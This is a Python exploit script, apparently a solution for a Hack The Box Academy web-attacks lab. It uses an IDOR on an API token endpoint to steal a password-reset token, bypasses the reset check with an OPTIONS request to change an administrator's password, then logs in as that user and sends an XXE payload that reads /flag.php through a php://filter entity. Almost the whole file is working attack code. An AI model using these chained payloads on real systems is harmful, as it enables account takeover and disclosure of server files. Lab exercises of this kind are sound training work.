#!/usr/bin/python3

"""
:author: H0n3yL04d
"""

import re
import requests
import sys

from pwn import *
from pprint import pprint
from time import sleep


def web_attack_skills_assessment(url: str):
    p1 = log.progress("initializing exploit")
    sess = requests.get(url=url+"index.php")

    # sess.headers.update({"Set-Cookie":f"{sess.headers['Set-Cookie']}; uid=1"})
    # headers = sess.headers

    login_data = {
        "username": "htb-student",
        "password": "123"
    }

    cookies = {
        "PHPSESSID": f"{sess.headers['Set-Cookie']}",
        "uid": "1"
    }

    ress = requests.post(url=url+"index.php", data=login_data)
    print(ress.text)
    # initializing the loop
    # for x in range(1, 101):

    p1.status(f"In the number: {74}")
    main_url = url+f"api.php/token/{74}"
    token_url = requests.get(url=main_url)
    token = token_url.json()["token"]
    reset_data = {"uid": 74, "token": token, "password": "123"}
    reset_ress = requests.post(
        url=url+"reset.php", data=reset_data, cookies=cookies)
    print(f"{74} => ", reset_ress.text)



def final_implementation_exploit(url):

    p1 = log.progress('Initializing explotation')
    x = 52
    sess = requests.get(url=url+"index.php")
    cookies = {
        "PHPSESSID": f"{sess.cookies.get_dict()['PHPSESSID']}",
        "uid": f"{x}"
    }
    print(type(cookies))
    login = requests.post(url=f"{url}index.php",
        data={"username": "htb-student", "password": "Academy_student!"},
        cookies=cookies)
    # user api
    user = requests.get(url+f"api.php/user/{x}", cookies=cookies)
    main_url = url+f"api.php/token/{x}"
    token_url = requests.get(url=main_url)
    token = token_url.json()["token"]
    reset_data = {"uid": str(x), "token": token, "password": "123456"}

    reset_ress = requests.options(
        url=url+"reset.php", params=reset_data, cookies=cookies)

    log.success("password for the administrator a.corrales has been updated successfully :)")
    print(f"{x} => ", reset_ress.text)

def final_exploit_execution(url):

    xml_exploit ="""<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.php" > ]>
    <root>
            <name>&ent;</name>
            <details>
test</details>
            <date>11/02/2022
</date>
            </root>"""

    sess = requests.get(url=url+"index.php")
    cookies = {
        "PHPSESSID": f"{sess.cookies.get_dict()['PHPSESSID']}",
        "uid": f"{52}"
    }
    headers = {
        "Content-Type":"application/xml"
    }
    print(cookies)
    login = requests.post(url=f"{url}index.php",
        data={"username": "a.corrales", "password": "123456"},
        cookies=cookies)
    
    xml_ress = requests.post(url=url+"addEvent.php", data=xml_exploit, cookies=cookies, headers=headers)
    print(xml_ress.text)


def main():
    try:
        url = sys.argv[1]
        final_implementation_exploit(url)
        final_exploit_execution(url)

    except Exception as e:
        raise Exception()
        print("error by: ", str(e))

    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
